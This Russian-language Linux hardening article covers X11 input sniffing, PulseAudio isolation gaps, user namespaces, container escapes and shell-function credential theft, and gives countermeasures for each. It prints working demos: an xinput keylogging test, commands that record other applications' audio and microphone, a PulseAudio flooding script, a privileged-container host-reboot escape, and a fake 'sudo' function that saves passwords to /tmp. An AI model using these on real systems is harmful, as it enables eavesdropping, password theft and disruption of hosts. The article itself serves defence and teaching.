# Некоторые современные вопросы безопасности в Linux и способы их решения {#Some-modern-Linux-security-questions}

В этой статье приводится современный взгляд на некоторые фундаментальные вопросы безопасности в Linux, и рекомендации по решению этих вопросов.

::: warning Дисклеймер
Все указанные ниже примеры приведены исключительно как способы проверки той или иной технологии защиты.
:::

## Вопрос выбора между Wayland или Xorg (X11) {#Wayland-or-X-eleven}

Многие пользователи Linux до сих пор не могут определиться с выбором платформы для графического окружения. Особенно среди домашних пользователей существует обширная полемика о том, чем все же лучше пользоваться Wayland или Xorg (X11)? 

С точки зрения безопасности ответ на этот вопрос вполне однозначен. Нужно использовать Wayland и минимизировать использование X11 (даже несмотря на то, что Xorg обычно работает быстрее, потребляет меньше ресурсов и поддерживает больше оборудования). Почему это так? Причин несколько:

- Протокол X11 (реализацией которого является популярный графический сервер Xorg) разрабатывался в середине восьмидесятых годов прошлого века, когда современные проблемы безопасности просто не считались актуальными, или не существовали вовсе. Поэтому архитектура протокола X11 не предусматривает некоторые обязательные теперь вещи, например изоляцию ввода-вывода между окнами сеанса. То есть, сама архитектура протокола X11 сильно устарела;
- Сопровождение этой архитектуры уже затруднено, особенно учитывая требования обратной совместимости и необходимость знать вещи, которые были нужны лет тридцать или больше назад, сейчас давно устаревшие и не используемые;
- Устранять уязвимости становится все тяжелее.

Всё это приводит к тому, что современные дистрибутивы Linux уже начали процесс постепенного отказа от X11 в пользу Wayland. И ALT Linux не исключение. В дистрибутивах на одиннадцатой платформе и в сборках платформы Sisyphus система по умолчанию загружает сеанс Wayland. 

Чтобы проверить, в каком графическом окружении выполняется текущий сеанс, можно выполнить команду:

```sh
$ echo $XDG_SESSION_TYPE 
wayland
```

В ответ система вернет значение графического окружения.

### Простой тест перехвата ввода в X11 {#Simple-test-for-input-isolation}

Как уже отмечалось выше, основная проблема протокола X11 -- это отсутствие изоляции ввода в графическом сеансе. Проще говоря, когда пользователь вводит информацию в любом окне своего сеанса, этот ввод перехватывается функцией ```xinput()``` графического сервера Xorg и транслируется всем остальным окнам в том же сеансе. А окно приложения, которому адресован ввод, само забирает и обрабатывает эти символы. Но, повторим, поступает этот ввод абсолютно всем окнам текущего сеанса. 

То есть, на практике, Xorg -- это фактически встроенный в систему перехватчик клавиатурного ввода (сниффер или кейлоггер), от которого нельзя избавиться, так как это поведение было заложено в архитектуру протокола X11 десятки лет назад. 

А если в графическом сеансе X11/Xorg запущено вредное (или недоверенное) графическое приложение, то оно также получит весь пользовательский ввод. Что такое приложение с этим вводом потом сделает -- определенно сказать невозможно, не подвергнув приложение динамическому анализу (это как минимум). В целом, может сделать всё, что угодно: записать то, что пользователь вводит в текстовый файл, который потом отправит куда-нибудь, или сразу отправит пользовательский поток ввода куда-то, и т.п.

Для того, чтобы продемонстрировать недостатки изоляции ввода в протоколе X11 можно сделать следующее:

1. Переключиться в сеанс Xorg и проверить, действительно ли переключение произошло:

```sh
$ echo $XDG_SESSION_TYPE
x11
```

2. Установить пакет ```xinput``` (от имени ```root``` или используя ```sudo```):

```sh
apt-get install xinput
```

3. Вывести (уже от имени пользователя, это важно) список текущих устройств ввода:

```sh
$ xinput list
⎡ Virtual core pointer
id=2 [master pointer (3)]
⎜ ↳ Virtual core XTEST pointerid=4 [slave pointer (2)]
⎜ ↳ VirtualPS/2 VMware VMMouseid=8 [slave pointer (2)]
⎜ ↳ VirtualPS/2 VMware VMMouseid=9 [slave pointer (2)]
⎜ ↳ spice vdagent tabletid=10 [slave pointer (2)]
⎣ Virtual core keyboardid=3 [master keyboard (2)]
↳ Virtual core XTEST keyboard
↳ Power Button
id=5 [slave keyboard (3)]
id=6 [slave keyboard (3)]
↳ AT Translated Set 2 keyboard
id=7 [slave keyboard (3)]
```

4. Обычно клавиатура имеет имя вроде ```AT Translated keyboard```, в текущем примере её идентификатор это семь. Затем от имени пользователя выполнить перехват ввода:

```sh
$ xinput test 7
```

5. Далее можно запустить любой браузер, открыть страницу с вашей почтой и авторизоваться на ней, введя имя или пароль. Потом переключиться обратно в терминал, и убедиться, что весь ввод перехватывается по числовым идентификаторам клавиш, например:

```sh
key press   64
key release 64
```

6. Совсем несложно вывести в текстовый файл полную таблицу используемых символов, а затем просто вычислить ввод:

```sh
$ xmodmap -pk > listkeys.txt
```

### Что можно сделать для противодействия {#What-to-do-for-X-eleven}

С точки зрения информационной безопасности можно рекомендовать следующее:

- Использовать только Wayland, и исключить (или чрезвычайно минимизировать использование X11/Xorg);
- Использовать программы входа в систему, которые сразу поддерживают Wayland (например, GDM);
- Следить за тем, чтобы по умолчанию менеджер входа загружал сессию Wayland. Или можно поступить ещё радикальнее: например, можно удалить или перенести в другой каталог файлы сессий Xorg ```/usr/share/xsessions/*.desktop```, оставив возможность использовать только сессии Wayland;
- Если уж отказаться от использования X11/Xorg по каким-то причинам нельзя, то постараться применять программы, полученные только из официальных источников Альт Линукс. Лучше избегать установки незнакомых приложений, полученных из сторонних источников; 
- Можно, кроме того, использовать т.н. «вложенный» X-сервер (nested X, см. ```xnest(1)```). Суть этой технологии в том, чтобы запустить внутри одного сеанса Xorg несколько других, чтобы каждое приложение или набор приложений получало свое графическое окружение, внутри общего сеанса X11. Однако такой способ является довольно громоздким в настройке и не очень удобным при использовании;
- настроить фильтр пакетов, чтобы минимизировать возможность взаимодействия Xorg и работающих приложений с внешними абонентами;
- Применять двухфакторную или двухшаговую аутентификацию, в том числе для внешних ресурсов, таких как почта, Git, аккаунты в социальных сетях, Госуслугах, и т.п. Это существенно усложнит возможности атаковать систему или программу, даже если основной пароль уже скомпрометирован;
- Использовать современный дистрибутив и регулярно обновлять его. 

Несмотря на некоторые всё еще имеющиеся проблемы с широтой охвата оборудования, взаимной совместимостью графических сред и приложений, а также с производительностью -- поддержка протокола Wayland постоянно совершенствуется. 

## Вопрос использования PulseAudio {#PulseAudio-isolation-weakness}

Многие пользователи по прежнему продолжают использовать звуковой сервер PulseAudio. В то время, как в операционных системах семейства Альт начиная с одиннадцатой платформы по умолчанию предлагается использовать звуковой сервер PipeWire. В десятой платформе можно переключиться с использования PulseAudio на использование PipeWire. 

В чем же здесь вопрос? Вопрос здесь концептуально полностью аналогичен предыдущему. Дело в том, что звуковой сервер PulseAudio проектировался 20 лет назад (еще в 2004 году, под именем Polypaudio). И у него тоже большие проблемы с изоляцией между приложениями. 

### Простые тесты на проверку изоляции приложений в PulseAudio {#Simple-tests-for-checking-isolation-in-PulseAudio}

1. Например, вот такой примерно командой можно получить доступ к уже смикшированному звуку других приложений (включая чужие приложения):

```sh
$ parec --file-format=wav -d $(pactl list sinks | grep Name | cut -d: -f2 | head).monitor snooped-audio.wav
```

2. Или вот такой командой можно получить доступ к микрофону занятому другим приложением (включая чужое приложение) и получить весь входной поток звука, попадающий в микрофон:


```sh
$ parec --file-format=wav -d $(pactl list sources | grep Name | grep -v '\.monitor' | cut -d: -f2 | head) microphone-audio.wav
```

3. А, например, вот такой командой можно приостановить аудиопоток любых приложений:

```sh
$ pactl suspend-sink $(pactl list sinks | grep Name | cut -d: -f2 | head) 1
```

4. С помощью PulseAudio можно даже создать простенький сетевой сервер и повесить его на все сетевые адреса компьютера не имея полномочий администратора ```root```:

```sh
$ pactl load-module module-native-protocol-tcp listen=0.0.0.0 port=1234
```

5. А вот такой простой сценарий фактически инициирует локальный «отказ в обслуживании» (для слабого компьютера) сервера PulseAudio:

```sh
#!/bin/bash

wget -nc https://archive.org/download/TenMinutesOfWhiteNoisePinkNoiseAndBrownianNoise/WhiteNoise.flac

	for i in {1..60}; do
	echo "Client #$i";
	pacat --latency-msec=5000 --rate=384000 WhiteNoise.flac &
	sleep 1
done
```


Существует много открыто опубликованных в сети эксплойтов, которые позволяют удаленно воздействовать на сервер PulseAudio и прерывать его работу.

### Что можно сделать для противодействия {#What-to-do-for-PulseAudio}

С точки зрения информационной безопасности можно рекомендовать следующее:

- Использовать только PipeWire, и исключить (или чрезвычайно минимизировать использование PulseAudio). К счастью, в операционных системах семейства Альт начиная с одиннадцатой платформы звуковой сервер PipeWire используется по умолчанию. Для тех, кто использует более раннюю платформу -- опубликовано руководство по переходу с PulseAudio на PipeWire. Ознакомиться с ним можно тут: <https://www.altlinux.org/Pipewire>;
- Использовать фильтр пакетов, чтобы, как минимум, блокировать возможности удалённого воздействия на звуковую подсистему;
- Осознанно принимать решения, когда приложение пытается запросить доступ к звуковому устройству, например, к микрофону;
- Настроить индикацию приложений во время использования звуковых устройств. Большинство графических окружений и браузеров умеют отображать специальный значок, когда используется камера или микрофон.

## Вопрос использования пользовательских пространств имён {#Is-it-safe-to-allow-usernamespaces}

Пользовательские пространства имён это довольно удобный и эффективный механизм изоляции в ядре Linux. Он позволяет пользователям создавать изолированные друг от друга пространства. Используется этот механизм для «песочниц» (sandbox) в некоторых приложениях. Например, браузер Google Chrome использует этот механизм для изоляции страниц друг от друга, и от доступа браузера к произвольным файлам системы и пользователей. На его базе работают т.н. «rootless» контейнеры (не требующие для своего запуска полномочий администратора ```root```), система управления приложениями Flatpak тоже может его использовать, как и некоторые другие программы.

Проверить, разрешено пользователю создавать пространства имён или нет довольно просто. Достаточно посмотреть соответствующую переменную ядра ОС:

```sh
$ cat /proc/sys/kernel/unprivileged_userns_clone
```

Если в ответ на эту команду вернется единица -- то создание пользовательских пространств имён в системе разрешено. Если ноль -- то запрещено. 

Пока нет однозначного ответа на вопрос, что лучше: разрешать пользователям создавать собственные пространства имён или нет? В индустрии всё ещё существует обширная полемика. Ниже представлено несколько аргументов как за такое разрешение, так и против.

За разрешение пользовательских пространств имён можно привести следующие аргументы:

1. Пользовательские приложения могут лучше изолироваться от системы и друг от друга, в том числе в одном приложении. Например, на базе пользовательских пространств выполняет изоляцию страниц браузер google-chrome и некоторые другие приложения (в основном те, которые используют WebKit, почтовый клиент evolution и некоторые другие важные пользовательские приложения); 

2. Пакеты Flatpak тоже могут использовать возможности изоляции user namespaces от системы и друг от друга, что обеспечивает лучшую безопасность. Если приложение Flatpak будет скомпрометировано (скажем, почтовый клиент, работающий в изоляции Flatpak), то есть шанс того, что будет скомпрометирован только почтовый ящик пользователя, но не все его данные в домашнем каталоге. Другой альтернативой является использование программы изоляции приложений Bubble Wrap, но тогда на неё придётся установить ```SUID``` бит;

3. Пользователи смогут выполнять непривилегированные контейнеры от своего имени, и в том случае, если пользователь ```root``` в контейнере осуществит выход за его пределы (например, ввиду найденной уязвимости), то основная система не будет скомпрометирована (по крайней мере полностью), так как пользователь ```root``` контейнера не будет ассоциирован с пользователем ```root``` в основной системе.

4. Выполнять привилегированные контейнеры -- это значит, ставить под угрозу основную систему (см. [подробнее](#Privileged-container-escapes)). 

Против разрешения пользовательских пространств имён можно привести следующие аргументы:

1. Механизм пользовательских пространств имён чисто архитектурно открывает доступ для обычных пользователей к тем структурам и функциям ядра, к которым в противном случае имеет доступ только пользователь ```root```. А сам механизм user_namespaces ещё пока далёк от безопасной реализации, да и в ядре постоянно находятся недостатки. Даже беглый поиск в популярной базе данных уязвимостей NVD CVE даёт одну-две опасных уязвимости, связанных с использованием пользовательских пространств имён в год (см. [Link display text](Link path) <https://nvd.nist.gov/vuln/search/results?form_type=Advanced&results_type=overview&query=user+namespaces&search_type=all&isCpeNameSearch=false&cpe_vendor=cpe%3A%2F%3Alinux&cpe_product=cpe%3A%2F%3A%3Alinux_kernel>);

2. Даже непривилегированные контейнеры как правило, требуют установки специальных аттомарных возможностей или т.н. capabilities. Например, возможности CAP_NET_ADMIN, CAP_SYS_ADMIN, CAP_SETUID и некоторые другие -- могут дать выполняемому процессу или контейнеру избыточно много полномочий, особенно, если неаккуратно их назначать. Подробнее о механизме назначения возможностей для субъектов и объектов в ядре ОС можно прочесть по ссылкам: <https://man7.org/linux/man-pages/man7/capabilities.7.html>, <https://linux-audit.com/kernel/capabilities/linux-capabilities-hardening-linux-binaries-by-removing-setuid/>. Многим администраторам и пользователям лень или нет времени вникать в обширную документацию о том, как правильно использовать capabilities, лишний раз перепроверить состав назначаемых capabilities, и т.п. Так что уж лучше просто выключить возможность использования пользовательских пространств имён; 

3. Несмотря на очевидные преимущества изоляции приложений, предоставляемых Flatpak, сами приложения создаются некоторыми разработчиками небрежно, предоставляя избыточный доступ к данным пользователей и системы в целом. Подробнее о том, как разработчики программ Flatpak всё ещё неаккуратно работают с правами своих приложений можно узнать, например, выполнив такой запрос (потребуется учетная запись к github): <https://github.com/search?q=org%3Aflathub+filesystem%3Dhost&type=code>, <https://github.com/search?q=org%3Aflathub+filesystem%3Dhome&type=code>.

### Что можно сделать с разрешением применять пользовательские пространства имён {#Linux-allow-userns-clone}

Учитывая современную полемику и сложность данного вопроса можно порекомендовать следующее:

1. Знать о состоянии переменных ядра, управляющих созданием пользовательских пространств имён;

2. Желательно заранее проанализировать назначение системы, оценить возможные риски и пользу, при разрешении использовать пользовательские пространства имён:

- Будут ли использоваться программы, изоляция в которых требует такого разрешения;
- Будут ли использоваться контейнеры, какие именно, и какой будет оркестратор;
- Будут ли использоваться программы из репозиториев Flatpak или Snap;
- Сегментировать разделы диска при установке ОС так, чтобы ```SUID``` программы находились в корневом разделе (и, возможно, еще в отдельно монтируемом разделе ```/opt```, а на остальные разделы применять ключ монтирования ```nosuid```.

### Концепция выбегания из песочницы привилегированного контейнера {#Privileged-container-escapes}

В качестве примера можно рассмотреть концепцию атаки на привилегированный контейнер LXC (скажем, в Proxmox VE), смонтировав изнутри контейнера от имени ```root``` служебную ФС ```/proc```, которая в данном случае является разделяемой (общей) между LXC контейнером и материнской (хост) системой:  

```bash
mount -t proc proc /mnt
```

Затем можно попробовать перезагрузить материнскую (хост) систему, отправив специальный сигнал в соответствующий обработчик ядра:

```sh
echo b > /mnt/sysrq-trigger
```

В общем, техник выбегания из песочниц привилегированных контейнеров много, и они хорошо известны (см. например: <https://madhuakula.com/kubernetes-goat/docs/scenarios/scenario-4/container-escape-to-the-host-system-in-kubernetes-containers/welcome/> или <https://habr.com/ru/companies/first/articles/650553/>).

## Вопрос обработки функций в оболочке {#Shell-functions-question}

Любая оболочка в Linux или Unix спроектирована и создана таким образом, что она сперва вызывает встроенные в неё функции, а уже затем файл, который ей передан в качестве аргумента. Основываясь на этом поведении оболочки существует масса техник перехвата ввода. Необходимо помнить, что если на важном сервере или на рабочей станции остался незаблокированный терминал, особенно в тех местах, где к этому терминалу может получить доступ кто-то еще -- можно внедрить в оболочку функцию перехвата ввода. 

### Простой тест перехвата ввода в оболочке {#Simple-test-for-stealing-cridentials}

Ниже приводится простой пример сценария оболочки, которой демонстрирует концепцию перехвата ввода в оболочке и записывает перехваченный пароль пользователя в файл в каталоге ```/tmp```:

```sh
function sudo () {
    realsudo="$(which sudo)"

    if grep -Fqs "$USER" /tmp/hackedPasswd.txt
    then
        $realsudo "${@:1}"
    else
        read -s -p "[sudo] password for $USER: " inputPasswd
        printf "\n"; printf '%s\n' "$USER : $inputPasswd" > /tmp/hackedPasswd.txt
        $realsudo -S <<< "$inputPasswd" -u root bash -c "exit" > /dev/null 2>&1
        $realsudo "${@:1}"
    fi
}
```

После этого можно вызвать:
 
```sh 
$ sudo -i
```

И, выполнив аутентификацию, полюбоваться на перехваченный пароль:
 
```sh 
$ cat /tmp/hackedPasswd.txt
```

Базируясь на таком принципе -- можно перехватывать любой ввод, обходя ограничения ```su```, ```sudo``` (включая обход разрешений на вызов ```sudo``` с аргументами), и т.п. 

Опасность применения такой техники ещё и в том, что в данном случае не требуется внедрение в систему каких-либо файлов, которые могли бы быть выявлены функциями контроля целостности или программами, выявляющими вредоносный код.

### Что можно сделать для противодействия {#What-to-do-if-stealing-is-possible}

1. Применять двухшаговую или двухфакторную аутентификацию;
2. Обязательно настроить автоматическую блокировку компьютера с запуском хранителя экрана, если это возможно. Если в системе нет графического интерфейса -- то применить технику блокировки любого терминала оболочки по тайм-ауту, чтобы ограничить потенциальное окно времени, в которое можно внедрить опасный сценарий оболочки если пользователь ушёл, и забыл заблокировать компьютер или выйти из интерактивного сеанса. Для этого можно установить мультиплексор терминала ```tmux``` и программу блокировки ```vlock``` чтобы создать конфигурацию для принудительной блокировки любого интерактивного сеанса оболочки по тайм-ауту.

Для установки ```vlock``` и ```tmux``` нужно выполнить команду (от имени ```root```): 

```sh
apt-get install tmux vlock
```

Для конфигурации принудительной блокировки сессии терминала при неактивности заданное время (потребуются полномочия ```root```) -- нужно создать файл ```/etc/bashrc.d/tty_lock_timeout.sh``` (права на него должны быть ```0755``` и владелец ```root```) в который внести:

```sh
if
command -v tmux &> /dev/null && [ -n "$PS1" ] && [[ ! "$TERM" =~ screen ]] && [[ !
"$TERM" =~ tmux ]] && [ -z "$TMUX" ]; then
exec tmux
fi
```

А затем создать конфигурационный файл ```/etc/tmux.conf``` (права на него должны быть ```0644``` и владелец ```root```) в котором указать желаемое время неактивности (в примере -- 900 секунд):

```sh
set -g lock-command vlock
set -g lock-after-time 900
bind L lock-session
set -g mouse on
```

После повторного входа в оболочку будет применена конфигурация принудительной блокировки сессии терминала по тайм-ауту.

